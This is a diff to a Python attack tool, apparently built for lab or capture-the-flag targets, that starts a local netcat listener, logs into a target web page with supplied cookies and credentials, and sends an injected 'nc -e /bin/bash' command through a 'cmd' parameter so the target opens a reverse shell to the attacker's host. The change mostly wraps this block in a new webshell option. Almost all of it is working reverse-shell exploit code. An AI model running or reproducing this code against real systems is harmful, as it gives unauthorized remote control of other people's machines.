@@ -198,40 +198,43 @@ class Shell_conncet:
                                 print("[+] Error         : ................ | : TimeUP")                        
                                 exit()
                             else:
-                                 break                            
-                path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
-                run    = 'gnome-terminal  -- '+ path
-                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                                     
-                request = mechanize.Browser()
-                request.set_handle_robots(False)
-                request.set_handle_redirect(True)
-                request.set_handle_refresh(True, max_time=1)  
-                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
-                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                    ('Cookie',str(self.Cookie).replace('\n','')),
-                                    ('username',f'{self.args.user}'),
-                                    ('password',f'{self.args.password}')]
-                if not self.args.port:                    
-                    command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
-                else:
-                    command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +" " + str(self.args.port)   
-                try:
-                    first_req = request.open(self.url).read()
-                    first_req = request.open(self.url).read()
-                    first_req = request.open(self.url).read()   
-                    time.sleep(4) 
-                    self.Get_Oregnal_URL = request.open(command).read()
-                    exit()
-                except Exception  as e :
-                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                         print("[*] Error : ",e )
-                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                         print("[*] Follow url Format ")
-                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
-                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
+                                 break   
+                if self.args.webshell:
+                   pass
+                else:  
+                    path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
+                    run    = 'gnome-terminal  -- '+ path
+                    xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                                     
+                    request = mechanize.Browser()
+                    request.set_handle_robots(False)
+                    request.set_handle_redirect(True)
+                    request.set_handle_refresh(True, max_time=1)  
+                    request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                                        Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                        ('Cookie',str(self.Cookie).replace('\n','')),
+                                        ('username',f'{self.args.user}'),
+                                        ('password',f'{self.args.password}')]
+                    if not self.args.port:                    
+                        command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
+                    else:
+                        command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +" " + str(self.args.port)   
+                    try:
+                        first_req = request.open(self.url).read()
+                        first_req = request.open(self.url).read()
+                        first_req = request.open(self.url).read()   
+                        time.sleep(4) 
+                        self.Get_Oregnal_URL = request.open(command).read()
+                        exit()
+                    except Exception  as e :
+                             print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                             print("[*] Error : ",e )
+                             print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                             print("[*] Follow url Format ")
+                             print("[*] url Format : http/https://<ip>:<port>/<dir>")  
+                             print("[*] Example : http://10.10.10.193:4000/page=index.php")
+                             exit()
+                    except KeyboardInterrupt:
                          exit()
-                except KeyboardInterrupt:
-                     exit()
         
 if __name__=='__main__':
    Shell_conncet() 
